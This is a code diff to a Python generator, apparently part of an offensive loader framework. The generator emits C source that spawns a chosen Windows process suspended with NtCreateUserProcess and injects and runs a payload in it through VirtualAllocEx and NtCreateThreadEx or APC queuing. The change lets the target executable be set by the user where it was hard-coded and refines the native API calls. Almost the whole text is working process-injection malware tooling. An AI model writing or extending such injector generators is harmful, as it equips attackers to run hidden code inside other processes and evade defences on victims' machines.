@@ -1,5 +1,5 @@
 from string import Template
-from pathlib import Path
+from pathlib import Path, PureWindowsPath
 import sys
 
 class spawnandinject:
@@ -33,13 +33,16 @@ class spawnandinject:
 """).substitute(target=self.target)
             self.apicallsList += ['CreateProcessA']
         elif self.spawn == 'NtCreateUserProcess':
+            parsed = PureWindowsPath(self.target)
+            curdir = str(parsed.parent).replace('\\','\\\\')
+            image = str(parsed.name).replace('\\','\\\\')
+            print(image)
             self.spawnCode = Template("""
-    UNICODE_STRING image, cmdline, curdir, desktop;
-    {RtlInitUnicodeString}(&image, L"C:\\\\Windows\\\\System32\\\\charmap.exe");
-    {RtlInitUnicodeString}(&cmdline, L"charmap.exe");
-    {RtlInitUnicodeString}(&curdir, L"C:\\\\Windows\\\\System32\\\\");
-    {RtlInitUnicodeString}(&desktop, L"WinSta0\\\\Default");
-    WCHAR kNtImage[] = L"\\\\??\\\\C:\\\\Windows\\\\System32\\\\charmap.exe";
+    UNICODE_STRING image = RTL_CONSTANT_STRING(L"$target");
+    UNICODE_STRING cmdline = RTL_CONSTANT_STRING(L"$image");
+    UNICODE_STRING curdir = RTL_CONSTANT_STRING(L"$curdir");
+    UNICODE_STRING desktop = RTL_CONSTANT_STRING(L"WinSta0\\\\Default");
+    WCHAR kNtImage[] = L"\\\\??\\\\$target";
     
     PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
     PS_CREATE_INFO createInfo    = {{ sizeof(createInfo) }};     /* State defaults to initial */
@@ -57,8 +60,8 @@ class spawnandinject:
     {RtlCreateProcessParametersEx}(&procParams, &image, NULL, &curdir, &cmdline, env, NULL, &desktop, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
  
     {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
-""").substitute(target=self.target)
-            self.apicallsList += ['NtCreateUserProcess', 'RtlCreateProcessParametersEx', 'RtlInitUnicodeString']
+""").substitute(target=self.target, image=image, curdir=curdir)
+            self.apicallsList += ['NtCreateUserProcess', 'RtlCreateProcessParametersEx']
 
         self.allocation = 'VirtualAllocEx'
         if 'allocation' in arguments:
@@ -154,7 +157,7 @@ class spawnandinject:
         elif self.execution == 'NtCreateThreadEx':
             self.executionCode = """
     HANDLE newThread;
-    {NtCreateThreadEx}(&newThread, THREAD_ALL_ACCESS, NULL, hProcess, buffer, NULL, 0, 0, 0, 0, NULL);
+    {NtCreateThreadEx}(&newThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)buffer, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 """
             self.apicallsList += ['NtCreateThreadEx', 'WaitForSingleObject']
         elif self.execution == 'NtQueueApcThread':
